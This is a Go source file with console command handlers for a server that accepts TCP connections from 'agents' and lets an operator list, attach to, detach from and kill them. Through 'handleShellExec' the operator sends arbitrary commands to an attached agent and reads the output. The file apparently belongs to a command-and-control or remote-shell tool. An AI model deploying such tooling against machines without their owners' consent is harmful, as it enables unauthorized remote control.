package server

import (
	"fmt"
	"strings"
)

func (server *Server) handleListen(args []string) (string, error) {
	if len(args) < 2 {
		return "Usage: listen <address> <agentID>", nil
	}
	address := args[0]
	agentID := AgentID(args[1])
	agentProxy, err := ListenTCP(address, agentID)
	if err != nil {
		return "", fmt.Errorf("failed to listen on address %s: %v", address, err)
	}
	server.agents[agentProxy.GetAgentID()] = agentProxy
	return fmt.Sprintf("Agent %s connected", agentProxy.GetAgentID()), nil
}

func (server *Server) handleAttach(args []string) (string, error) {
	if len(args) < 1 {
		return "Usage: attach <agentID>", nil
	}
	agentID := AgentID(args[0])

	agent, exists := server.agents[agentID]
	if !exists {
		return "", fmt.Errorf("No such agent with ID %s", agentID)
	}

	server.currentAgent = agent
	return fmt.Sprintf("Agent set to: %s", server.currentAgent.GetAgentID()), nil
}

func (server *Server) handleKill(args []string) (string, error) {
	if len(args) < 1 {
		return "Usage: kill <agentID>", nil
	}
	agentID := AgentID(args[0])
	agent, exists := server.agents[agentID]
	if !exists {
		return "", fmt.Errorf("No such agent with ID %s", agentID)
	}

	err := agent.Stop()
	if err != nil {
		return "", err
	}
	delete(server.agents, agentID)
	return fmt.Sprintf("Agent %s killed", agentID), nil
}

func (server *Server) handleListAgents(args []string) (string, error) {
	var responseBuilder strings.Builder
	if len(server.agents) == 0 {
		return "No agents connected", nil
	}

	for agentID, agent := range server.agents {
		responseBuilder.WriteString(fmt.Sprintf("=== Agent ID: %s ===\n%+v\n==================\n", agentID, agent))
	}
	return responseBuilder.String(), nil
}

func (server *Server) handleClear(args []string) (string, error) {
	fmt.Println("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
	return "", nil
}

func (server *Server) handleDetach(args []string) (string, error) {
	prevAgentID := server.currentAgent.GetAgentID()
	server.currentAgent = nil
	return fmt.Sprintf("Detached from agent: %s", prevAgentID), nil
}

func (server *Server) handleShellExec(args []string) (string, error) {
	fmt.Println("Running agent exec:", args)

	if server.currentAgent == nil {
		return "", fmt.Errorf("No agent attached. Use 'attach <agentID>' to attach to an agent.")
	}

	err := server.currentAgent.Send(args)
	if err != nil {
		return "", fmt.Errorf("Failed to send command to agent %s: %v", server.currentAgent.GetAgentID(), err)
	}

	resp, err := server.currentAgent.Receive()
	if err != nil {
		return "", fmt.Errorf("Receiving response from agent %s failed: %v", server.currentAgent.GetAgentID(), err)
	}
	return resp, nil
}
